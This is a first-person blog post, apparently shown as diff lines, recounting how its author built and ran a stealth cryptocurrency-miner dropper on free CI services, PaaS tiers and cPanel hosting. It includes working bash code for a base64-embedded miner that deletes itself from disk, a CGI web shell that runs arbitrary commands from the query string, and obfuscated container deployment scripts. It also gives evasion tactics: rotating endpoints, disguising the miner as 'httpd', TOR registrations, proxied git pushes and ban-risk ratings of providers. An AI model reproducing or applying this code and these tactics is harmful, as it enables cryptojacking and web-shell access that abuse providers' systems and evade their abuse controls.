+<p>In our bash roundup we showed utilities for connection. Why do we need these? Because we need diversity; simply hard coding an endpoint into the configuration won&#39;t last long, when something looks suspicious, and has network activity, IPs are flagged.</p>
+<p>At the start we experimented with a couple of methods:</p>
+<ul>
+<li><p>using <a href="https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains">proxychains</a> to overload the miner network calls, but it required the miner to be built with dinamic libraries, and you had to ship them with the payload, so it was impractical.</p>
+
+<li><p>running a <a href="https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost">forward tunnel</a> side by side with the miner: this had a lot of configuration overhead, as now we were configuring two processes on each deployment, which amounted to more bugs.</p>
+
+</ul>
+<p>At the end we settled with just shipping a list of endpoints, stored in an bash variables, picking one at random. Connections were of course encrypted. What are these endpoints? Forwarders to the proxy which would handle the miners jobs.</p>
+
+<img src="/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png" alt="">
+<p>Why do we need a <a href="https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy">mining proxy</a>? I never really went past ~100 concurrent connections, so a proxy was not really necessary for network load, but it was convenient for negotiating the hashing algorithm, and to provide different difficulty targets to different miners, to prevent miners from working on <strong>difficulty</strong> targets that would take them too much time to complete and avoid the risk of wasting computation on unfinished jobs. <sup id="fnref:difficulty"><a href="#fndef:difficulty" class=fnref >[5]</a></sup> The pool software also required a few modifications as it was happily advertising to be a proxy on plain http requests...<em>that had to be timed-out</em>, and a fork added access control so we based our mods on that. <sup id="fnref:stratumprotocol"><a href="#fndef:stratumprotocol" class=fnref >[6]</a></sup></p>
+<h3 id=editing_json ><a href="#editing_json" class=header-anchor >Editing json</a></h3>
+<p>Applying modifications to a json file with just bash we got by with some env var substitution, and some regex. Initially we were relying on an <code>envsubst</code> binary to apply variables, then we went full bash <sup id="fnref:fullbash"><a href="#fndef:fullbash" class=fnref >[7]</a></sup> with this logic:</p>
+<ul>
+<li><p>read config template</p>
+
+<li><p>replace all quotes with a very esoteric string &#40;like <code>_#_#</code>&#41;</p>
+
+<li><p><code>eval</code> the template</p>
+
+<li><p>replace all the esoteric occurrences back with quotes</p>
+
+</ul>
+<p>Apart from avoiding sub processes, another advantage is that we get complete bash capabilities in our templates. For reading and writing without templates, we have to rely on bash regex capabilities:</p>
+<pre><code class=language-bash >cc_rgx&#61;&#39;&#40; *&quot;.*?&quot; *: *&#41;&#40;&quot;&#40;.*?&#41;&quot;|&#40;&#91;^,&#93;*?&#41;&#41; *&#40;,|.*?\/\/.*?|\n|&#36;&#41;&#39;
+change_config&#40;&#41; &#123;
+	local subs
+	while read l; do
+		if &#91; &quot;&#36;&#123;l&#125;&quot; &#33;&#61; &quot;&#36;&#123;l/\&quot;*&#36;1*\&quot;*:/&#125;&quot; &#93;; then
+			&#91;&#91; &quot;&#36;&#123;l&#125;&quot; &#61;~ &#36;cc_rgx &#93;&#93;
+			matches&#61;&#40;&quot;&#36;&#123;BASH_REMATCH&#91;@&#93;&#125;&quot;&#41;
+			&#91; -n &quot;&#36;&#123;matches&#91;3&#93;&#125;&quot; -a &quot;&#36;&#123;2:0:1&#125;&quot; &#33;&#61; &quot;\&quot;&quot; &#93; &amp;&amp;
+				subs&#61;&quot;\&quot;&#36;2\&quot;&quot; ||
+				subs&#61;&quot;&#36;2&quot;
+			CONFIG&#61;&#36;&#123;CONFIG/&#36;&#123;matches&#91;0&#93;&#125;/&#36;&#123;matches&#91;1&#93;&#125;&#36;subs&#36;&#123;matches&#91;5&#93;&#125;&#125;
+			break
+		fi
+	done &lt;&lt;&lt;&quot;&#36;&#40;printf &#39;&#37;s&#39; &quot;&#36;CONFIG&quot; 2&gt;/dev/null&#41;&quot;
+&#125;
+
+## output miner config value &#36;1 unquoted
+gc_rgx&#61;&#39; *&quot;&#91;^:&#93;&#43;&quot; *: *&#40;&quot;&#40;.*?&#41;&quot;|&#40;&#91;^,&#93;*&#41;&#41; *&#40;,|.*?\/\/.*?|\n|&#36;&#41;&#39;
+get_config&#40;&#41; &#123;
+	while read l; do
+		if &#91; &quot;&#36;&#123;l&#125;&quot; &#33;&#61; &quot;&#36;&#123;l/\&quot;*&#36;1*\&quot;*:/&#125;&quot; &#93;; then
+			&#91;&#91; &quot;&#36;&#123;l&#125;&quot; &#61;~ &#36;gc_rgx &#93;&#93;
+			&#91; -n &quot;&#36;&#123;BASH_REMATCH&#91;2&#93;&#125;&quot; &#93; &amp;&amp;
+				printf &#39;&#37;s&#39; &quot;&#36;&#123;BASH_REMATCH&#91;2&#93;&#125;&quot; ||
+				printf &#39;&#37;s&#39; &quot;&#36;&#123;BASH_REMATCH&#91;3&#93;&#125;&quot;
+			break
+		fi
+	done &lt;&lt;&lt;&quot;&#36;&#40;printf &#39;&#37;s&#39; &quot;&#36;CONFIG&quot; 2&gt;/dev/null&#41;&quot;
+&#125;</code></pre>
+<p>This only allows us to edit single lines, for multi-line entries it just considers the first line..but it is good enough for our use case.</p>
+<h2 id=runtime ><a href="#runtime" class=header-anchor >Runtime</a></h2>
+<p>What does our runtime look like? We have a main bash process that executes the main loop, then the miner sub-process, the cpu monitor sub-process, the locker and the tuner. That&#39;s almost a handful.</p>
+<p>First we want to ensure that if something goes wrong, we don&#39;t leave a mess, this means that we use a bash trap to perform cleanups on termination</p>
+<pre><code class=language-bash >trap &quot;trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \&#36;&#40;jobs -p&#41;; cleanup &amp;&gt;/dev/null ; fleep 10&quot; SIGINT EXIT SIGKILL SIGTERM</code></pre>
+<p><code>trap - ...</code> unsets the trap to prevent recursion. The trap kills all the jobs and removes the working environment.</p>
+<p>It&#39;s time to start the miner, which is stored as a bash variable in base64 encoding. We dump it on the filesystem, then we dump the config, execute the miner, and remove both the miner and the config. On linux you can remove the executable of a running process, &#40;on windows this is not allowed&#41;. <sup id="fnref:memoryondemand"><a href="#fndef:memoryondemand" class=fnref >[8]</a></sup> When the miner is running, on the filesystem there is just a <code>.. /</code> directory with a <code>b64</code> link in it.</p>
+<pre><code class=language-bash >## put a file &#36;1 into a var &#36;2
+fileToVar&#40;&#41;&#123;
+    declare -n tmpd&#61;&quot;&#36;2&quot; &amp;&amp; tmpd&#61;&#36;&#40;b64e &quot;&#36;1&quot;&#41; &amp;&amp; return
+    if &#91; -z &quot;&#36;tmpd&quot; &#93;; then
+        log &quot;gobbling in array&quot;
+        eval &quot;&#36;2&#61;1&quot; ## avoid empty checks
+        gobbled&#91;&#36;2&#93;&#61;&#36;&#40;b64e &quot;&#36;1&quot;&#41;
+    else
+        return 1 ## do not quote assignment otherwise ram is not released
+    fi
+&#125;
+## put a var &#36;1 into a file &#36;2
+varToFile&#40;&#41;&#123;
+    if &#91; -n &quot;&#36;VERBOSE&quot; &#93;; then
+        if declare -n 2&gt;&gt;&#36;&#123;VERBOSE&#125; &amp;&amp; eval &quot;b64d &lt;&lt;&lt;\&quot;\&#36;&#36;1\&quot; 1&gt;\&quot;&#36;2\&quot; 2&gt;&gt;&#36;&#123;VERBOSE&#125;&quot;; then
+            return
+        else
+            # log &quot;dumping from array&quot;
+            eval &quot;b64d &lt;&lt;&lt;\&quot;\&#36;&#123;gobbled&#91;&#36;1&#93;&#125;\&quot; 1&gt;\&quot;&#36;2\&quot; 2&gt;&gt;&#36;&#123;VERBOSE&#125;&quot; &amp;&amp; return
+        fi
+        return 1
+    else if declare -n &amp;&amp; eval &quot;b64d &lt;&lt;&lt;\&quot;\&#36;&#36;1\&quot; &gt;\&quot;&#36;2\&quot;&quot;; then
+             return
+         else
+             # log &quot;dumping from array&quot;
+             eval &quot;b64d &lt;&lt;&lt;\&quot;\&#36;&#123;gobbled&#91;&#36;1&#93;&#125;\&quot; &gt;\&quot;&#36;2\&quot;&quot; &amp;&amp; return
+         fi
+         return 1
+    fi
+&#125;</code></pre>
+<p>A maddening quirk encountered with bash while encoding the miner is that assigning a variable with a subshell with quotes <code>myvar&#61;&quot;&#36;&#40;something&#41;&quot;</code> causes a permanent increase in memory usage, this was hard to debug and haven&#39;t really found the reason why behaves like this, anyway the assignment has to be unquoted. Decoding instead is done with <em>herestrings</em> which is an abstraction over temporary files, the variable is dumped into a file that is then piped back into the process.</p>
+<p>The miner long running loop:</p>
+<ul>
+<li><p>while true</p>
+<ul>
+<li><p>stop miner</p>
+
+<li><p>remove config</p>
+
+<li><p>start miner</p>
+
+<li><p>while true</p>
+<ul>
+<li><p>start daemon</p>
+<ul>
+<li><p>while miner is running</p>
+<ul>
+<li><p>read the output from miner</p>
+
+<li><p>choose miner action based on output line</p>
+
+</ul>
+
+</ul>
+
+<li><p>if miner is not running: break</p>
+
+</ul>
+
+<li><p>sleep</p>
+
+</ul>
+
+</ul>
+<p>The output line is matched against some regex:</p>
+<pre><code class=language-bash >act_rgx&#61;&#39;&#40;accepted|speed|paused|algo:|-&gt; update config|-&gt; publish config|-&gt; trigger restart|\&#91;CC\-Client\&#93; error|Error: \&quot;\&#91;Connect\&#93;|POOL #1:      \&#40;null\&#41;&#41;|not enough memory|self-test failed|read error|cpu  disabled&#39;</code></pre>
+<p>The daemon handles cases where</p>
+<ul>
+<li><p>the connection to the endpoint gives errors &#40;pick a new random endpoint&#41;</p>
+
+<li><p>the hashing algorithm changes &#40;adjust sleep time and ad-hoc configurations&#41;</p>
+
+<li><p>miner problems &#40;restart the miner&#41;.</p>
+
+</ul>
+<p>For a while there was support for the command and control dashboard, which allowed to trigger manual restarts, however since its usage was minimal it was discarded, and its endpoints were replaced with an alternative pool connection, also the restart process was unstable, complex...another instance of tech debt. However it allowed to re-fetch an updated payload and re-setup all configurations on the fly, which was pretty cool, the ultimate trampoline.</p>
+<h2 id=debugging ><a href="#debugging" class=header-anchor >Debugging</a></h2>
+<p>There are three main utilities</p>
+<ul>
+<li><p>enable/disable tracing around code blocks &#40;we don&#39;t want to trace a b64 encoded binary in a variable..&#41;</p>
+
+<li><p>a simple function for formatting logs</p>
+
+<li><p>a flag that would activate verbose logging at runtime whenever the miner was started.</p>
+<ul>
+<li><p>does the file <code>.debug</code> exist?</p>
+<ul>
+<li><p>enable verbose logging</p>
+
+</ul>
+
+</ul>
+
+</ul>
+<h2 id=target_deployments ><a href="#target_deployments" class=header-anchor >Target deployments</a></h2>
+<p>This setup has been tested on 3 kind of hosts:</p>
+<h3 id=self_hosted_containers_or_vms ><a href="#self_hosted_containers_or_vms" class=header-anchor >Self hosted containers or VMs</a></h3>
+<p>Many hosting providers don&#39;t like mining since CPU resources tend to be shared among multiple users, and mining software can easily slow down a host node impacting performance for the rest of the users. This can true even if CPU user time is unlimited, because hashing algorithms can saturate all the caching layers of the CPU if the cache is shared among all the CPU cores.</p>
+<p>We would like to use our <em>fair</em> share of resources without getting banned, that&#39;s a good use-case for our stealth dropper since it is host usage aware, which means it <em>should</em> stay kind of within &#91;AUP&#93;. There is no extra steps when dealing with self hosted deployments, just the launcher script, maybe added to the boot sequence or launched manually.</p>
+<h3 id=cpanel_based_web_hosting ><a href="#cpanel_based_web_hosting" class=header-anchor >cPanel based web hosting</a></h3>
+<p>Web hosting subscriptions plans are mostly offered through &#91;cPanel&#93;. Again here we are using personal subscription plans which have reasonable resource limits, on the other hand any free plan has ridiculous limits <sup id="fnref:freehostinglimits"><a href="#fndef:freehostinglimits" class=fnref >[9]</a></sup>. cPanel allows you to define handlers for different file extensions, this allows us to execute shell scripts through the <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">cgi</a> with an http request against a shell script uploaded on the server. These kind of interfaces are what web-shells look like <sup id="fnref:cpanelssh"><a href="#fndef:cpanelssh" class=fnref >[10]</a></sup>. A simple bash web shell</p>
+<pre><code class=language-bash ># without content encoding the request response won&#39;t be honored
+echo -e &#39;Content-Type: text/plain\n&#39;
+SERVER_NAME&#61;myserver
+## parse vars &#40;for interactive use&#41;
+saveIFS&#61;&#36;IFS
+IFS&#61;&#39;&#61;&amp;&#39;
+parm&#61;&#40;&#36;QUERY_STRING&#41;
+IFS&#61;&#36;saveIFS
+for &#40;&#40;i&#61;0; i&lt;&#36;&#123;#parm&#91;@&#93;&#125;; i&#43;&#61;2&#41;&#41;
+do
+    declare var_&#36;&#123;parm&#91;i&#93;&#125;&#61;&#36;&#123;parm&#91;i&#43;1&#93;&#125;
+done
+## exec command for interactive and proclimited scenarios
+url_encoded&#61;&quot;&#36;&#123;var_path//&#43;/ &#125;&quot;
+export PATH&#61;&quot;.:&#36;PATH&quot;
+. /dev/shm/srv/utils/load.env &amp;&gt;/dev/null
+
+if declare -f &quot;&#36;&#123;url_encoded/\&#37;20*&#125;&quot; 1&gt;/dev/null; then ## don&#39;t use -n, redirect fd for bcompat
+    printf &#39;&#37;b&#39; &quot;&#36;&#123;url_encoded//&#37;/\\x&#125;&quot; &gt; /tmp/&#36;&#123;SERVER_NAME&#125;.src
+else
+    if builtin &quot;&#36;&#123;url_encoded/\&#37;20*&#125;&quot;; then
+        printf &#39;&#37;b&#39; &quot;&#36;&#123;url_encoded//&#37;/\\x&#125;&quot; &gt; /tmp/&#36;&#123;SERVER_NAME&#125;.src
+    else
+        printf &#39;exec &#37;b&#39; &quot;&#36;&#123;url_encoded//&#37;/\\x&#125;&quot; &gt; /tmp/&#36;&#123;SERVER_NAME&#125;.src
+    fi
+fi
+. /tmp/&#36;&#123;SERVER_NAME&#125;.src</code></pre>
+<p>It is better to only rely on builtins as forking additional processes may not be allowed in web jails, but it is always possible to <code>exec</code> which allows us to use most command line utilities. Most web shells are written in other scripting languages like python or php as you don&#39;t have to worry about forking.</p>
+<p>In a cpanel environment it is better to use a static name for the miner process, like <code>httpd</code> or <code>php-fpm</code> because <code>cgi</code> is based on multi processing, so servers are always filled with many processes named like this, although a careful observer should notice the <em>multi-threaded</em> usage pattern which is definitely not common &#40;or possible&#41; for languages such as perl, php, ruby, or python&#33;</p>
+<p>Processes have also a time limit by default, &#40;1 hour, 1 day, etc..&#41;, for this we just use a cron job that restarts the dropper.</p>
+<p>This required a lot of manual editing, the cpanel api to automate this is unfortunately not exposed to end users, so web hosting is a clunky and boring target for our miner dropper.</p>
+<h3 id=web_environments ><a href="#web_environments" class=header-anchor >Web environments</a></h3>
+<p>There are <em>SaaS</em> providers that have a web editor coupled with a container, such as <a href="with a free tier before getting acquired by amazon">cloud9</a>, &#91;codeanywhere&#93;, &#91;codenvy&#93;. Deploying the dropper here is easy &#40;you have a full fledged environment&#41;, but keeping it running is a burden, since any interactive web editor terminates its session soon after the web page is closed, and the container is consequently put to sleep &#40;unless you pay of course&#41;.</p>
+<p>Circumventing this can only mean that we have to keep the sessions open, some scripting with &#91;puppeteer&#93; achieved the desired result, but having long running, memory leaking, bloated SPAs web pages is definitely unattractive and not stealthy, because from the provider backend, a session opened 24/7 will definitely look suspicious. Indeed, web environments are also clunky and boring targets.</p>
+<h3 id=free_apps_services ><a href="#free_apps_services" class=header-anchor >Free apps services</a></h3>
+<p>This is mainly <a href="when it used to have a free tier">openshift</a> <sup id="fnref:openshift"><a href="#fndef:openshift" class=fnref >[11]</a></sup> and &#91;heroku&#93;. Openshift, being kubernetes was somewhat straightforward to deploy, but full of configuration churn, here is an excerpt:</p>
+<pre><code class=language-zsh >export PATH&#61;.:&#36;PATH
+
+&#91; -z &quot;&#36;OC_PRJ&quot; &#93; &amp;&amp; &#123; echo &quot;no account data provided&quot;; exit 1; &#125;
+obfs&#61;~/utils/deploy/obfs.sh
+&#91; -x &#36;obfs &#93; ||
+    &#123; echo &quot;obfs utility not found&#33;&quot;; exit 1; &#125;
+launcher&#61;~/launcher
+&#91; -f &#36;launcher &#93; ||
+    &#123; echo &quot;launcher script not found&#33;&quot;; exit 1; &#125;
+
+ctroot&#61;&#36;&#123;CT_ROOT_DIR:-oc-ct-box-mine&#125;
+## the service that starts the miner is named app in /etc/services.d in the rootfs
+scriptpath&#61;&quot;rootfs/etc/services.d/app/run&quot;
+TYPE&#61;&#36;&#123;HRK_TYPE:-worker&#125;
+IMG&#61;&#36;&#40;oc-endpoint&#41;/&#36;OC_PRJ/&#36;OC_APP
+tspath&#61;/tmp/oc-tmp-apprun
+prepend&#61;&quot;#&#33;/usr/bin/with-contenv bash
+&quot;
+## beware the newline ^^^
+
+cd &#36;ctroot || &#123; echo &quot;couldn&#39;t find ct build directory&quot;; exit 1; &#125;
+
+VARS&#61;&#36;&#40;cat vars&#41; || &#123; echo &#39;vars file empty&#33;&#39;; &#125;
+VARS&#61;&#36;&#123;VARS//&#36;&#39;\n&#39;/ &#125;
+VARS&#61;&#36;&#123;VARS//\\/\\\\&#125; ## preserve escapes
+script&#61;&#36;&#40;cat &#36;launcher | tail &#43;2 | sed -r &#39;/^echo &quot;export \\&#36;/a &#39;&quot;&#36;VARS&quot;&#39; \\&#39;&#41;
+cat &lt;&lt;&lt; &quot;&#36;script&quot; &gt; &#36;tspath
+&#36;obfs &#36;tspath
+&#91; -z &quot;&#36;&#123;tspath&#125;.obfs&quot; &#93; &amp;&amp; &#123; echo &quot;obfs file not found?&quot;; exit 1; &#125;
+cat &lt;&lt;&lt; &quot;&#36;prepend&#36;&#40;cat &quot;&#36;&#123;tspath&#125;.obfs&quot;&#41;&quot; &gt; &#36;scriptpath
+exec itself &#40;should eval&#41;
+chmod &#43;x &#36;scriptpath
+
+docker build -t &#36;IMG  . || exit 1
+cd -
+oc-push-image &quot;&#36;IMG&quot;</code></pre>
+<p>This was the script used to build the mining container which required a yaml template:</p>
+<pre><code class=language-yaml >apiVersion: build.openshift.io/v1
+kind: BuildConfig
+metadata:
+  labels:
+    build: &#36;&#123;OC_APP&#125;
+  name: &#36;&#123;OC_APP&#125;
+spec:
+  activeDeadlineSeconds: 5184000
+  failedBuildsHistoryLimit: 0
+  successfulBuildsHistoryLimit: 0
+  resources:
+    limits:
+      cpu: 2
+      memory: 1Gi
+  runPolicy: Serial
+  source:
+    type: Binary
+  strategy:
+    sourceStrategy:
+      from:
+        kind: ImageStreamTag
+        name: &#36;&#123;OC_APP&#125;-build:latest
+        namespace: &#36;&#123;OC_PRJ&#125;
+    type: Source
+  template:
+    activeDeadlineSeconds: 2400
+  triggers:
+    - generic:
+        secretReference:
+          name: &#36;&#123;OC_APP&#125;
+      type: Generic</code></pre>
+<p>But the whole process involved quite a lot of steps&#33;</p>
+<pre><code class=language-zsh >## init
+&#91; -z &quot;&#36;OC_APP&quot; &#93; &amp;&amp; export &#36;&#40;&lt;&#36;&#40;tfi&#41;&#41;
+&#91; -z &quot;&#36;OC_APP&quot; &#93; &amp;&amp; &#123; . ./choose-creds || exit 1; &#125;
+oc-login
+oc new-project &#36;OC_PRJ || &#123; &#91; -z &quot;&#36;&#40;oc get projects&#41;&quot; &#93; &amp;&amp; exit 1; &#125;
+oc new-app &#36;OC_APP --allow-missing-images || exit 1
+
+## build box with docker and push
+# oc-docker-login || exit 1
+oc-build-mine || exit 1
+
+## create dc config
+export OC_TEMPLATE_TYPE&#61;mine
+oc-box-template || exit 1
+rtr&#61;0
+while &#91; &#36;rtr -lt 10 &#93;; do
+  oc rollout latest &#36;OC_APP &amp;&amp; break
+  rtr&#61;&#36;&#40;&#40;rtr&#43;1&#41;&#41;
+  read -t 1
+done
+exit
+## builds
+bash -x oc-build-build || exit 1
+bash -x oc-build-template || exit 1
+oc start-build &#36;OC_APP || exit 1
+
+accounts&#61;&#36;&#123;ACCOUNTS_DIR:-accounts_queue&#125;
+mv &#36;accounts/&#36;&#123;OC_USR&#125;&#123;\.this,\.&#36;&#40;date &#43;&#37;s&#41;&#125;</code></pre>
+<p>In pseudo code:</p>
+<ul>
+<li><p>create the project</p>
+
+<li><p>create the application without an image</p>
+
+<li><p>build the mining container</p>
+
+<li><p>deploy the container with a deployment config &#40;kubernetes abstraction&#41;</p>
+
+<li><p>rollout the deployment</p>
+
+</ul>
+<p>The <code>build-build</code> scripts instead created a <em>build</em> container which would mine for a few hours at a time. Builds and normal pods have separate resources in openshift so we exploited both of them. Openshift was overall a bad experience since it went over 4 different releases &#40;maybe more, I stopped tracking after a while&#41; and each of them required changes to the configurations, they had no upgrade paths and everything was quickly iterated over, and it was common for builds/pods to stall, and not being garbage collected...they usually ran manual restarts every once in a while, maybe kubernetes was just buggy :&#41;</p>
+<p>Heroku configuration was a little bit simpler &#40;it doesn&#39;t involve kubernetes&#41;. Apart the container build, which was similar to the openshift one, the rest was just two cli commands</p>
+<pre><code class=language-bash >heroku config:set HRK_APP&#61;&#36;HRK_APP -a &#36;HRK_APP
+heroku container:release -a &#36;HRK_APP &#36;TYPE</code></pre>
+<p>The container was directly pushed with docker over to the heroku registry. <sup id="fnref:herokucontainers"><a href="#fndef:herokucontainers" class=fnref >[12]</a></sup> The friction with heroku &#40;which free tier is still standing up to the time of writing&#41; is that dynos can only run for 22 days per month so they required some manual management each month, again clunky and boring. They did execute some ban waves at the beginning, and then they disabled registrations through TOR, I am quite sure I was the cause of this.</p>
+<h3 id=ci_containers_or_vms ><a href="#ci_containers_or_vms" class=header-anchor >CI containers or VMs</a></h3>
+<p>These were the most synergic targets for our dropper. There are many <a href="https://en.wikipedia.org/wiki/Continuous_integration">CI</a> companies, many of which are burning investors money offering free tiers in the hope of collecting some market share in the tech infrastructure business.</p>
+<p>All these services offer different resources, have different configurations requirements and run in different environments. I never considered automating account registration because those kind of things are dreadful to program, I try to avoid them all the time, so I just endured manual registrations for a while as I was curious to what kind of anti spam response I would get &#40;and how different from the rest&#33;&#41;. You can guess some things about the management of a company from how it handles spam:</p>
+<ul>
+<li><p>Does it perform ban waves? Then they have non strict policies, problems are handled manually and case by case</p>
+
+<li><p>Does it require phone verification? They were already abused in the past</p>
+
+<li><p>Do they respond to heavy resource usage? They are running on a tight budget</p>
+
+<li><p>Do they apply account restrictions or shadow bans? If they shadow ban, they have mean sysadmins.</p>
+
+</ul>
+<p>There is also a philosophical question: If a service allows you to abuse their system for a long time, does it mean that they have a top-of-the-shelf infrastructure capable of handling the load, or simply poor control over their system? And you must consider the balance between accessibility and security, a system too secure can lower user retention.</p>
+<p>Here&#39;s a table showing some services that I deployed to:</p>
+<pre><code class=plaintext ><table>
+  <tr class = "header headerLastRow">
+    <th style = "text-align: center;">ci
+    <th style = "text-align: center;">configuration
+    <th style = "text-align: center;">performance
+    <th style = "text-align: center;">ban-hammer
+  
+  <tr>
+    <td style = "text-align: center;">Bitrise
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Travis
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: green; text-align: center;">good
+  
+  <tr>
+    <td style = "text-align: center;">Codeship
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Gitlab
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: green; text-align: center;">good
+  
+  <tr>
+    <td style = "text-align: center;">Circleci
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Semaphore
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Docker
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: green; text-align: center;">good
+  
+  <tr>
+    <td style = "text-align: center;">Quay
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Codefresh
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Wercker
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: red; text-align: center;">bad
+  
+  <tr>
+    <td style = "text-align: center;">Azure-pipelines
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: red; text-align: center;">bad
+  
+  <tr>
+    <td style = "text-align: center;">Continuousphp
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Buddy
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: red; text-align: center;">bad
+  
+  <tr>
+    <td style = "text-align: center;">Drone
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: red; text-align: center;">bad
+  
+  <tr>
+    <td style = "text-align: center;">Appveyor
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: yellow; text-align: center;">medium
+    <td style = "color: red; text-align: center;">bad
+  
+  <tr>
+    <td style = "text-align: center;">Nevercode
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: yellow; text-align: center;">medium
+  
+  <tr>
+    <td style = "text-align: center;">Zeist/vercel
+    <td style = "color: red; text-align: center;">bad
+    <td style = "color: green; text-align: center;">good
+    <td style = "color: red; text-align: center;">bad
+  
+</table>
+</code></pre>
+<p>In this context, a <span style="color: green"> good</span> configuration means that it didn&#39;t take much time to configure a <code>ci</code> job for the mining process &#40;like all services relying on a web dashboard instead of a repository dot-file were a chore&#41;, a <span style="color: red"> bad</span> <code>ban-hammer</code> means that it was hard to register to the service, or that accounts would get banned more aggressively.</p>
+<p><a href="https://web.archive.org/web/20210222050951/https://www.bitrise.io/">Bitrise</a> requires to setup a project, to infer the environment, the target architecture, the execution process and other things, it was very time consuming to setup a build so it got a bad rating in configuration. <a href="https://web.archive.org/web/20210310010750/https://continuousphp.com/">Continuousphp</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/">Buddy</a>, &#91;Codefresh&#93; also had a lot of manual non declarative configuration steps.</p>
+<p>Services like &#91;Azure-pipelines&#93;, <a href="https://web.archive.org/web/20210308202144/https://app.wercker.com/">Wercker</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/">Buddy</a> applies shadow-bans on the accounts, shadow-bans are bad, as they leave you guessing if there is something wrong with your configuration or not. With some services you can guess the reason of the ban &#40;pretty much your build took too much time, or you built too many times in a short period&#41;, for some others like &#91;Azure-pipelines&#93; I assume they applied some kind of fingerprint to the user repositories as bans were coming through even without any abuse of resources, azure and vercel also restricted <code>DNS</code> access within public build machines, so that was additional friction that needed to be overcome with ad-hoc tunnel.</p>
+<p><a href="https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome">Drone</a> gave access to a whole 16&#43; cores processor but ended up banning after 2 builds <sup id="fnref:saddrone"><a href="#fndef:saddrone" class=fnref >[13]</a></sup>. <a href="https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship">Codeship</a> also gives access to powerful build hosts and didn&#39;t ban as aggressively as drone.</p>
+<p>My favorite services not because of profitability but for ease and convenience &#40;also with other projects&#41; were <a href="https://web.archive.org/web/20210324163536/https://travis-ci.org/">Travis</a>, <a href="https://web.archive.org/web/20210308041527/https://semaphoreci.com/">Semaphore</a> and <a href="https://web.archive.org/web/20210322105637/https://hub.docker.com/">Docker-hub</a>. Travis is like the standard CI and is very flexible, Semaphore is the only <code>DSL</code> for <code>CI</code> that looked approachable and well though instead of just an endless sequence of spaghettified check-boxes like other UIs, and Docker just for the simplicity to map dockerfiles to builds.</p>
+<h3 id=builds_configs ><a href="#builds_configs" class=header-anchor >Builds configs</a></h3>
+<p>The builds were triggered either by cron jobs offered by web services or by git commits. So you had to keep track of a littering of access tokens or ssh keys to manage all the git commits. It was also important to not over-spam commits, and use proxies when pushing to the repositories configuring git:</p>
+<pre><code class=language-gitconfig >&#91;http&#93;
+        proxy &#61; socks5://127.0.0.1:9050
+        sslverify &#61; false
+&#91;https&#93;
+        proxy &#61; socks5://127.0.0.1:9050
+        sslverify &#61; false
+&#91;url &quot;https://&quot;&#93;
+    insteadOf &#61; git://</code></pre>
+<p>Using git hosting services, github has been the one more thorough about bans, but they were only executed upon abuse reports by ci services admins, gitlab executed a ban wave once, when I tried to renew the CI trial &#40;carelessly&#41;. I have never received a ban for a bitbucket account. To &#40;force&#41; push git commits, we have a long running loop that re-tags the git repository:</p>
+<pre><code class=language-bash >while :; do
+    repos_count&#61;&#36;&#40;ls -ld &#36;&#123;repos&#125;/* | grep -c ^d&#41;
+    repos_ival&#61;&#36;&#40;&#40;&#40;RANDOM&#37;variance&#43;delay&#41;/repos_count&#41;&#41;
+    for r in &#36;repos/*; do
+        cd &quot;&#36;r&quot;
+        git fetch --all
+        tagger
+        echo -e &quot;\e&#91;32m&quot;&quot;sleeping for &#36;repos_ival since &#36;&#40;date &#43;&#37;H:&#37;M:&#37;S\ &#37;b/&#37;d&#41;&quot;&quot;\e&#91;0m&quot;
+        sleep &#36;repos_ival
+    done
+    sleep 1
+done</code></pre>
+<p>It might be possible that force pushing this way is not something github likes very much and could have been a cause for accounts getting flagged. The tagger function tasked with force pushing a different commits, uses a website &#40;which you can lookup quite easily&#41; that gives some randomized commits. I am not sure how much this helps, since the content itself of the commits is obviously suspicious for my case. And it also bit me in the ass once, since the commits returned by this command can include swear words, one of my commits was picked up by a twitter bot that tracks git commits with swear words&#33; I added a blacklist for bad words after the incident.</p>
